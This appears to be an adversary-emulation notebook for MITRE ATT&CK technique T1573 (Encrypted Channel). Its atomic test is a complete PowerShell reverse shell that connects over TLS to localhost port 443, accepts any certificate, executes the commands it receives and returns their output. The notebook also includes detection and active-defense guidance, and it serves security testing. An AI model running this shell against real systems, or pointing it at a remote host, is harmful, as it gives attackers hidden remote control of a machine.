{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9cd765a2",
   "metadata": {},
   "source": "# T1573 - Encrypted Channel\nAdversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files."
  },
  {
   "cell_type": "markdown",
   "id": "1f0faf7f",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1007701d",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - OpenSSL C2",
    "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$server_ip = 127.0.0.1\n$server_port = 443\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f97f9044",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1573 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "5f8f5684",
   "metadata": {},
   "source": "## Detection\nSSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
  },
  {
   "cell_type": "markdown",
   "id": "20a3a067",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Protocol Decoder \n Use software designed to deobfuscate or decrypt adversary command and control (C2) or data exfiltration traffic. \n\n Protocol decoders are designed to read network traffic and contextualize all activity between the operator and the implant. These tools are often required to process complex encryption ciphers and custom protocols into a human-readable format for an analyst to interpret.\n#### Opportunity\nThere is an opportunity to reveal data that the adversary has tried to protect from defenders\n#### Use Case\nDefenders can reverse engineer malware and develop protocol decoders that can decrypt and expose adversary communications\n#### Procedures\nCreate and apply a decoder which allows you to view encrypted and/or encoded network traffic in a human-readable format.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}